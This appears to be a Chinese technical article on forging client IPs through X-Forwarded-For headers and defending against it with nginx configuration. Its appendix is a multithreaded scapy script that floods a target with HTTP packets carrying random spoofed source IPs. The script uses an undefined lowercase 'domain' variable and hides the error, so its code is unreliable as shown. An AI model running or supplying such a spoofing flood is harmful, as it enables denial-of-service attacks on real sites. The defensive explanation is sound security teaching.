title: ip伪造与防范 

#  ip伪造与防范 
在阅读本文前，大家要有一个概念，**由于TCP需要三次握手连接，在实现正常的TCP/IP 双方通信情况下，是无法伪造来源 IP 的**，也就是说，在 **TCP/IP 协议中，可以伪造数据包来源 IP** ，但这会让发送出去的` 数据包有去无回，无法实现正常的通信 `。
<WRAP center round tip 60%>
一些DDoS 攻击，它们只需要不断发送数据包，而不需要正常通信，它们就会采取这种"发射出去就不管"的行为来进行攻击。
</WRAP>
那么在HTTP 中， " 伪造来源 IP",  又是如何造成的？如何防御之？
先搞明白后端应用IP获取来源
1.’**REMOTE_ADDR**’是远端IP，默认来自tcp连接客户端的Ip。可以说，它最准确，确定是，只会得到直接连服务器客户端IP。**如果对方通过代理服务器上网，就发现。获取到的是代理服务器IP了。**
如：a->b(proxy)->c  ,如果c 通过’REMOTE_ADDR’ ，只能获取到b的IP,获取不到a的IP了。
这个值是无法修改的。

2.’**HTTP_X_FORWARDED_FOR**’，’**HTTP_CLIENT_IP**’ 为了能在大型网络中，获取到最原始用户IP，或者代理IP地址。对HTTp协议进行扩展。定义了实体头。
HTTP_X_FORWARDED_FOR = clientip,proxy1,proxy2其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。
HTTP_CLIENT_IP 在高级匿名代理中，这个代表了代理服务器IP。
` 其实这些变量，来自http请求的：X-Forwarded-For字段，以及client-ip字段。 ` 正常代理服务器，当然会按rfc规范来传入这些值。
**但是，攻击者也可以直接构造该x-forword-for值来"伪造源IP",并且可以传入任意格式IP.**
这样结果会带来2大问题，其一，如果你设置某个页面，做IP限制。 对方可以容易修改IP不断请求该页面。 其二，这类数据你如果直接使用，将带来SQL注册，跨站攻击等漏洞。
这类问题，其实很容易出现，比如很多时候利用这个骗取大量伪装投票。那么该如何修复呢？
在代理转发及反向代理中经常使用X-Forwarded-For 字段。
X-Forwarded-For(XFF)的有效性依赖于代理服务器提供的连接原始IP地址的真实性，因此, XFF的有效使用应该保证代理服务器是可信的.
比如Nginx代理服务器，我们可以在其转发/反向代理的时候主动配置X-Forwarded-For为正确的值。
```

location / {
	proxy_pass  ....;
	proxy_set_header X-Forwarded-For $remote_addr ;
}

```
**$remote_addr 是 nginx 的内置变量，代表了客户端真实（网络传输层） IP 。**通过此项措施，强行将 X-Forwarded-For 设置为客户端 ip,  使客户端无法通过本文所述方式“伪造 IP ”。

如果最前端（与用户直接通信）代理服务器是与php fastcgi 直接通信，则需要在其上设定：
```

location ~ \.php$ {
fastcgi_pass localhost:9000;
fastcgi_param  HTTP_X_FORWARD_FOR  $remote_addr;
}

```

但是更常用的配置如下：
```

proxy_set_header   Host             $host;
proxy_set_header   X-Real-IP        $remote_addr;
proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;

```
后台代码，通过X-Real-IP头来获取客户真实IP
##  附：发射出去就不管的IP伪造 
python使用scapy修改源IP发送请求
```

from scapy.all import *  
from threading import Thread  
from Queue import Queue  
import random  
import string  
  
# items used for picking random HTTP User-Agent header value    
USER_AGENTS = (       
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",  
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2661.102 Safari/537.36",  
    "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.2) Gecko/20020508 Netscape6/6.1",  
    "Mozilla/5.0 (X11;U; Linux i686; en-GB; rv:1.9.1) Gecko/20090624 Ubuntu/9.04 (jaunty) Firefox/3.5",  
    "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10"  
)    
DOMAIN = "www.example.com"
#伪造100个IP
SOURCE = ['.'.join((str(random.randint(1,254)) for _ in range(4))) for _ in range(100)]  
  
class Scan(Thread):  
    HTTPSTR = 'GET / HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n'  
    def run(self):  
        for _ in range(100):  
            http = self.HTTPSTR % (DOMAIN,random.choice(USER_AGENTS))  
            try:  
                request = IP(src=random.choice(SOURCE),dst=domain) / TCP(dport=80) / http  
                #request = IP(dst=domain) / TCP(dport=80) / http  
                send(request)  
            except:  
                pass  
            
task = []  
for x in range(10):  
    t = Scan()  
    task.append(t)  
  
for t in task:  
    t.start()  
  
for t in task:  
    t.join()  
  
print('all task done!')

```
参考:
http://www.cnblogs.com/chengmo/archive/2013/05/29/php.html
http://zhangxugg-163-com.iteye.com/blog/1663687
http://blog.csdn.net/lemon_tree12138/article/details/51198116